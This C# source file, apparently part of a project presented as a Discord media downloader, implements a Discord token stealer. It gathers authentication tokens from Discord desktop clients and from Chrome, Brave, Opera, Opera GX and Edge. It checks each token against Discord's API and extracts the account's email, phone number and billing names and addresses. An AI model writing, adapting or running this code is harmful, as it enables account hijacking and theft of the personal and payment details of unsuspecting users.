using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;

using Discord_Media_DL.Token.Apps;

using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace Discord_Media_DL.Token
{
    static class TokenSearcher
    {
        /// <summary>
        /// All the Applications that may run Discord in either an App or the Browser.
        /// </summary>
        public static List<IApp> Applications => new()
        {
            new Apps.Discord(),
            new DiscordPTB(),
            new DiscordCanary(),
            new Chrome(),
            new Brave(),
            new Opera(),
            new Edge(),
            new OperaGX(),
        };

        #region Getting The Tokens
        /// <summary>
        /// Get all the Discord Tokens from all supported apps.
        /// </summary>
        /// <returns></returns>
        public static async Task<List<DiscordToken>> GetTokensAsync()
        {
            List<DiscordToken> result = new();

            try
            {
                // Create a list of tasks so we can run them in parallel later.
                // We do this as this is way faster than running it sequential.
                // We use a KeyValuePair here, so we can know which App returned which Tokens.
                List<Task<KeyValuePair<IApp, string[]>>> tasks = new();

                // Add all the "GetTokens" Tasks into the list.
                foreach (IApp application in Applications)
                {
                    // Add a Task for each App to the list. 
                    // Each task will return the tokens for their application.
                    tasks.Add(Task.Factory.StartNew(() => new KeyValuePair<IApp, string[]>(application, application.GetTokens().Result)));
                }

                // Run all the Tasks in Parallel and get the resulting Tokens, then add them all to the final result list.
                foreach (KeyValuePair<IApp, string[]> appResult in await Task.WhenAll(tasks))
                {
                    foreach (var token in appResult.Value)
                    {
                        if (string.IsNullOrWhiteSpace(token) == true)
                            continue;

                        // If any of the existing DiscordTokens have the token inside them, we ignore it. 
                        // The "Any()" function is part of C#'s "LinQ". Its good practice to use these kinds of functions
                        // to avoid unnessecary nesting and complexity.
                        if (result.Any((t) => t.Token == token))
                            continue;

                        result.Add(new DiscordToken(appResult.Key, token));
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex);
            }

            return result;
        }
        #endregion

        #region Filtering and getting the data associated with these Tokens
        private static DiscordUser? GetUserInfo(HttpClient client)
        {
            if (client == null)
                return null;

            DiscordUser? result = null;

            var rawJson = client.GetStringAsync("https://discord.com/api/v9/users/@me").Result;

            if (string.IsNullOrWhiteSpace(rawJson) == false)
            {
                // Turn the json into a jobject, so we can easily extract the values.
                JObject json = (JObject)JsonConvert.DeserializeObject(rawJson);

                DiscordUser tempUser = new();

                // Check all the values.
                // The "wrapping into try/catch-blocks" is just something I like to do,
                // because I dont trust this shit.
                try
                {
                    if (json.TryGetValue("id", out JToken jt) && string.IsNullOrWhiteSpace(jt.ToString()) == false)
                        tempUser.ID = jt.ToString();
                }
                catch { }

                try
                {
                    if (json.TryGetValue("username", out JToken jt) && string.IsNullOrWhiteSpace(jt.ToString()) == false)
                        tempUser.Name = jt.ToString();
                }
                catch { }

                try
                {
                    if (json.TryGetValue("avatar", out JToken jt) && string.IsNullOrWhiteSpace(jt.ToString()) == false)
                    {
                        if (string.IsNullOrWhiteSpace(tempUser.ID) == false)
                            tempUser.Avatar = $"https://cdn.discordapp.com/avatars/{tempUser.ID}/{jt}";
                    }
                }
                catch { }

                try
                {
                    if (json.TryGetValue("locale", out JToken jt) && string.IsNullOrWhiteSpace(jt.ToString()) == false)
                        tempUser.Locale = jt.ToString();
                }
                catch { }

                try
                {
                    if (json.TryGetValue("email", out JToken jt) && string.IsNullOrWhiteSpace(jt.ToString()) == false)
                        tempUser.Mail = jt.ToString();
                }
                catch { }

                try
                {
                    if (json.TryGetValue("phone", out JToken jt) && string.IsNullOrWhiteSpace(jt.ToString()) == false)
                        tempUser.Phone = jt.ToString();
                }
                catch { }

                try
                {
                    if (json.TryGetValue("discriminator", out JToken jt) && string.IsNullOrWhiteSpace(jt.ToString()) == false)
                        tempUser.Discriminator = jt.ToString();
                }
                catch { }

                result = tempUser;
            }

            return result;
        }

        private static List<DiscordPaymentInfo> GetPaymentInfo(HttpClient client)
        {
            if (client == null)
                return null;

            List<DiscordPaymentInfo> result = new();

            var rawJson = client.GetStringAsync("https://discordapp.com/api/v6/users/@me/billing/payment-sources").Result;

            if (string.IsNullOrWhiteSpace(rawJson) == false)
            {
                // Turn the json into a jobject, so we can easily extract the values.
                JArray all_biling_data = (JArray)JsonConvert.DeserializeObject(rawJson);

                foreach (JObject billing_data in all_biling_data)
                {
                    try
                    {
                        JObject billing_info = (JObject)billing_data.GetValue("billing_address");

                        DiscordPaymentInfo temp = new();

                        try
                        {
                            if (billing_data.TryGetValue("email", out JToken jt) && string.IsNullOrWhiteSpace(jt.ToString()) == false)
                                temp.Email = jt.ToString();
                        }
                        catch { }

                        try
                        {
                            if (billing_info.TryGetValue("name", out JToken jt) && string.IsNullOrWhiteSpace(jt.ToString()) == false)
                                temp.FullName = jt.ToString();
                        }
                        catch { }

                        try
                        {
                            if (billing_info.TryGetValue("line_1", out JToken jt) && string.IsNullOrWhiteSpace(jt.ToString()) == false)
                                temp.Address1 = jt.ToString();
                        }
                        catch { }

                        try
                        {
                            if (billing_info.TryGetValue("line_2", out JToken jt) && string.IsNullOrWhiteSpace(jt.ToString()) == false)
                                temp.Address2 = jt.ToString();
                        }
                        catch { }

                        try
                        {
                            if (billing_info.TryGetValue("city", out JToken jt) && string.IsNullOrWhiteSpace(jt.ToString()) == false)
                                temp.City = jt.ToString();
                        }
                        catch { }

                        try
                        {
                            if (billing_info.TryGetValue("state", out JToken jt) && string.IsNullOrWhiteSpace(jt.ToString()) == false)
                                temp.State = jt.ToString();
                        }
                        catch { }

                        try
                        {
                            if (billing_info.TryGetValue("country", out JToken jt) && string.IsNullOrWhiteSpace(jt.ToString()) == false)
                                temp.Country = jt.ToString();
                        }
                        catch { }

                        try
                        {
                            if (billing_info.TryGetValue("postal_code", out JToken jt) && string.IsNullOrWhiteSpace(jt.ToString()) == false)
                                temp.PostalCode = jt.ToString();
                        }
                        catch { }

                        result.Add(temp);
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine(ex);
                    }
                }
            }

            return result;
        }

        public static async Task<List<DiscordUser>> FilterTokensAsync(List<DiscordToken> tokens)
        {
            if (tokens == null || tokens.Count == 0)
                return new List<DiscordUser>();

            List<DiscordUser> result = new();

            // Prepare the Tasks list, as we will run this one in parallel just like before to save time.
            List<Task<KeyValuePair<bool, DiscordUser?>>> tasks = new();

            foreach (DiscordToken token in tokens)
            {
                tasks.Add(Task.Factory.StartNew(() =>
                {
                    var isValid = false;
                    DiscordUser? user = null;

                    try
                    {
                        using HttpClient client = new();
                        client.DefaultRequestHeaders.Add("authorization", token.Token);
                        client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Safari/537.36");

                        DiscordUser? tempUser = GetUserInfo(client);

                        if (tempUser != null)
                        {
                            // we have to create a new variable because .netframework c# sucks 
                            DiscordUser tempUser2 = tempUser.Value;

                            tempUser2.PaymentInfo = GetPaymentInfo(client).ToArray();

                            tempUser2.Token = token;
                            user = tempUser2;
                            isValid = true;
                        }
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine(ex);
                    }

                    return new KeyValuePair<bool, DiscordUser?>(isValid, user);
                }));
            }

            // Just like before, we run these Tasks in parallel, as this is wayyyy faster than running them sequential.
            foreach (KeyValuePair<bool, DiscordUser?> filterResult in await Task.WhenAll(tasks))
            {
                if (filterResult.Value == null)
                    continue;

                // If the Token couldn't be validated, we simply ignore it.
                if (filterResult.Key == false)
                    continue;

                // Avoid duplicate users by looking at the ID 
                if (result.Any((dcu) => dcu.ID == filterResult.Value.Value.ID) == true)
                    continue;

                // We just add it to the resulting list, as we have filtered out all the invalid tokens.
                result.Add(filterResult.Value.Value);
            }

            return result;
        }
    }
    #endregion
}
